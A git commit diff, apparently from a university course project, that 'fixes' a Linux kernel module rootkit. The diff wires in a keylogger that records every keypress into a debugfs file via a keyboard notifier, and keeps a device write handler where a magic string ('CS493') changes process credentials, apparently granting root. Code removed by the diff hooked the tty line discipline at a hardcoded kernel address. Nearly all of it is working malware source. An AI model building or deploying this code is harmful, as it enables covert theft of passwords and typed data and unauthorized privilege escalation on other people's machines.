6fe4a42aa5d3f38308cd71884a68736481506b1e
root <andrew.parkerr10@gmail.com>
2019-12-03 15:53:45 -0900

    Fixing keylogger

--- lkmr.c
+++ lkmr.c
@@ -24,7 +24,7 @@
 #include <linux/keyboard.h>
 #include <linux/input.h>
 
-//#include "logger.c"
+#include "logger.c"
 //#include <include/fcntl.h>
 
 
@@ -52,6 +52,7 @@ static ssize_t dev_read  (struct file *f, char *buf, size_t len, loff_t *off);
 static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, loff_t *off);
 static int dev_release(struct inode *inodep, struct file *filep);
 static int run_keylogger(void);
+static int exit_keylogger(void);
 
 
 // *********************************************************************
@@ -75,41 +76,6 @@ static struct class*  rootcharClass		= NULL;
 static struct device* rootcharDevice	= NULL;
 static int    				numberOpens 		= 0;
 
-static const char *keymap[][2] = {
-	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
-	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
-	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
-	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
-	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
-	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
-	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
-	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
-	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
-	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
-	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
-	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
-	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
-	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
-	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
-	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
-	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
-	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
-	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
-	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
-	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
-	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
-	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
-	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
-	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
-	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
-	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
-	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
-	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
-	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
-	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
-	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
-	{"_PAUSE_", "_PAUSE_"},                                         // 119
-};
 
 static struct file_operations fops =
 {
@@ -210,6 +176,7 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 	printk ("Device write\n");
 	char   magic[] = "CS493";
 	char   logger[] = "keylogger";
+	char exitlogger[] = "exitkeylogger";
 	struct cred *new_cred;
 	if (memcmp(buf, magic, (int)sizeof(magic)-1) == 0) 	// compares data and magic
 	{
@@ -229,7 +196,12 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 	else if(memcmp(buf, logger, (int)sizeof(logger)-1) == 0)
 	{
 		printk("Keylogger activated\n");
-		//run_keylogger();
+		run_keylogger();
+	}
+	else if(memcmp(buf, exitlogger, (int)sizeof(logger)-1) == 0)
+	{
+		printk("Keylogger deactivated\n");
+		exit_keylogger();
 	}
 	return len;
 }
@@ -237,7 +209,34 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 static int run_keylogger(void)
 {
 
+	if (codes < 0 || codes > 2)
+		return -EINVAL;
+
+	subdir = debugfs_create_dir("lkmr", NULL);
+	if (IS_ERR(subdir))
+		return PTR_ERR(subdir);
+	if (!subdir)
+		return -ENOENT;
+
+	file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
+	if (!file) {
+		debugfs_remove_recursive(subdir);
+		return -ENOENT;
+	}
+
+	/*
+	 * Add to the list of console keyboard event
+	 * notifiers so the callback keysniffer_cb is
+	 * called when an event occurs.
+	 */
+	register_keyboard_notifier(&keysniffer_blk);
 	return 0;
+}
+
+static int exit_keylogger(void)
+{
+	unregister_keyboard_notifier(&keysniffer_blk);
+	debugfs_remove_recursive(subdir);
 }
 
 
--- logger.c
+++ logger.c
@@ -1,119 +1,165 @@
-//logger.c
-//Andrew & Alex
-//CS 493 Final Project
-
-#include <linux/module.h>	/* Needed by all modules */
-#include <linux/kallsyms.h> /* for kallsyms_lookup_name */
 #include <linux/init.h>
 #include <linux/kernel.h>
-#include <linux/device.h>
-#include <linux/fs.h>
-#include <asm/uaccess.h>
-#include <linux/slab.h>
-#include <linux/syscalls.h>
-#include <linux/types.h>
-#include <linux/cdev.h>
-#include <linux/cred.h>
-#include <linux/version.h>
+#include <linux/module.h>
+#include <linux/moduleparam.h>
 #include <linux/keyboard.h>
+#include <linux/debugfs.h>
 #include <linux/input.h>
-#include <linux/tty.h>
-#include <linux/drivers/tty/n_tty.c>
 
-//// Prototypes ////
+#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
+#define CHUNK_LEN 12 /* Encoded 'keycode shift' chunk length */
+#define US  0 /* Type code for US character log */
+#define HEX 1 /* Type code for hexadecimal log */
+#define DEC 2 /* Type code for decimal log */
 
-static void new_receive_buf(struct tty_struct *tty, const unsigned char * cp, char *fp, int count);
+#define KEYSNIFFER_VERSION "1.7"
 
-static void proxy_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count);
+/* User specified log pattern, used as a module parameter */
+static int codes;
 
-static void hijack_tty_ldisc_receive_buf(void);
+/* Register global variable @codes as a module parameter with type and permissions */
+module_param(codes, int, 0644);
+/* Add module parameter description for @codes */
+MODULE_PARM_DESC(codes, "log format (0:US keys (default), 1:hex keycodes, 2:dec keycodes)");
 
-static void unhijack_tty_ldisc_receive_buf(void);
+/* Declarations */
+static struct dentry *file;
+static struct dentry *subdir;
 
-int procfile_read(char *buffer, char **buffer_location, off_t offset, int buffer_length, int *eof, void *data);
+static ssize_t keys_read(struct file *filp,
+		char *buffer,
+		size_t len,
+		loff_t *offset);
 
-static int create_keylogger_proc_entry(void);
+static int keysniffer_cb(struct notifier_block *nblock,
+		unsigned long code,
+		void *_param);
 
-static void remove_keylogger_proc_entry(void);
+/* Definitions */
 
-struct tty_ldisc_ops *our_tty_ldisc_N_TTY = (struct tty_ldisc_ops *) 0xffffffff81eba600;
-
-
-struct line_buf {
-	char line[100000];
-	int pos;
+/*
+ * Keymap references:
+ * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
+ * http://www.quadibloc.com/comp/scan.htm
+ */
+static const char *us_keymap[][2] = {
+	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
+	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
+	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
+	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
+	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
+	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
+	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
+	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
+	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
+	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
+	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
+	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
+	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
+	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
+	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
+	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
+	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
+	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
+	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
+	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
+	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
+	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
+	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
+	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
+	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
+	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
+	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
+	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
+	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
+	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
+	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
+	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
+	{"_PAUSE_", "_PAUSE_"},                                         // 119
 };
 
-static struct line_buf key_buf;
+static size_t buf_pos;
+static char keys_buf[BUF_LEN];
 
-//// Begin Functions ////
+const struct file_operations keys_fops = {
+	.owner = THIS_MODULE,
+	.read = keys_read,
+};
 
-static void new_receive_buf(struct tty_struct *tty, const unsigned char * cp, char *fp, int count)
+/**
+ * keys_read - read function for @file_operations structure
+ */
+static ssize_t keys_read(struct file *filp,
+			 char *buffer,
+			 size_t len,
+			 loff_t *offset)
 {
-	original_receive_buf(tty, cp, fp, count);
-	proxy_receive_buf(tty, cp, fp, count);
+	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
 }
 
-static void proxy_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
+static struct notifier_block keysniffer_blk = {
+	.notifier_call = keysniffer_cb,
+};
+
+/**
+ * keycode_to_string - convert keycode to readable string and save in buffer
+ *
+ * @keycode: keycode generated by the kernel on keypress
+ * @shift_mask: Shift key pressed or not
+ * @buf: buffer to store readable string
+ * @type: log pattern
+ */
+void keycode_to_string(int keycode, int shift_mask, char *buf, int type)
 {
-	if (!tty->read_buf || tty->real_raw){
-	return;
+	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
+		const char *us_key = (shift_mask == 1)
+		? us_keymap[keycode][1]
+		: us_keymap[keycode][0];
+
+		snprintf(buf, CHUNK_LEN, "%s", us_key);	
 	}
-
-	if(count == 1){
-		if (*cp == BACKSPACE_KEY){
-			key_buf.line[--key_buf.pos] = 0;
-		}else if (*cp == ENTER_KEY) {
-			key_buf.line[key_buf.pos++] = '\n';
-		}else {
-			key_buf.line[key_buf.pos++] = *cp;
-		}
-	}
 }
 
-static void hijack_tty_ldisc_receive_buf(void)
+/**
+ * keysniffer_cb - keypress callback, called when a keypress
+ * event occurs. Ref: @notifier_block structure.
+ *
+ * Returns NOTIFY_OK
+ */
+int keysniffer_cb(struct notifier_block *nblock,
+		  unsigned long code,
+		  void *_param)
 {
-	our_tty_ldisc_N_TTY = (struct tty_ldisc_ops *) 0xffffffff81eba600;
-	
-	original_receive_buf = our_tty_ldisc_N_TTY->receive_buf;
-	our_tty_ldisc_N_TTY->receive_buf = new_receive_buf;
+	size_t len;
+	char keybuf[CHUNK_LEN] = {0};
+	struct keyboard_notifier_param *param = _param;
+
+	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
+		 code, param->down, param->shift, param->value);
+
+	/* Trace only when a key is pressed down */
+	if (!(param->down))
+		return NOTIFY_OK;
+
+	/* Convert keycode to readable string in keybuf */
+	keycode_to_string(param->value, param->shift, keybuf, codes);
+	len = strlen(keybuf);
+	if (len < 1) /* Unmapped keycode */
+		return NOTIFY_OK;
+
+	/* Reset key string buffer position if exhausted */
+	if ((buf_pos + len) >= BUF_LEN)
+		buf_pos = 0;
+
+	/* Copy readable key to key string buffer */
+	strncpy(keys_buf + buf_pos, keybuf, len);
+	buf_pos += len;
+
+	/* Append newline to keys in special cases */
+	if (codes)
+		keys_buf[buf_pos++] = '\n';
+	pr_debug("%s\n", keybuf);
+
+	return NOTIFY_OK;
 }
-
-static void unhijack_tty_ldisc_receive_buf(void)
-{
-	our_tty_ldisc_N_TTY->receive_buf = original_receive_buf;
-}
-
-#define PROCFS_NAME "keyloggerrrr"
-
-int procfile_read(char *buffer,
-		  char **buffer_location,
-		  off_t offset, int buffer_length, int *eof, void *data)
-{
-	return sprintf(buffer, key_buf.line);
-}
-
-static int create_keylogger_proc_entry(void)
-{
-	struct proc_dir_entry *r;
-	r = create_proc_read_entry(PROCFS_NAME, 0, NULL, procfile_read, NULL);
-	if(!r)
-		return -ENOMEM;
-	return 0;
-}
-
-static void remove_keylogger_proc_entry(void)
-{
-	remove_proc_entry(PROCFS_NAME, NULL);
-}
-
-
-
-
-
-
-
-
-
-
 
